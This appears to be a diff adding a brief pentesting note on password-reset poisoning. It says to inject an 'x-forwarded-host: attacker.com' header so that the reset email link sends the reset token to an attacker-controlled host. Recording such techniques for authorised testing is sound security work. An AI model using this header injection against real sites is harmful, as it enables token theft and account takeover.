@@ -1,0 +1,9 @@
+
+
+
+1 password reset function 
+
+add x-forwarded-host: attacker.com in headers 
+in email link will be  attacker.com?token=4841641654618465
+
+--------------------------------------------------------------------------------------------------------------------
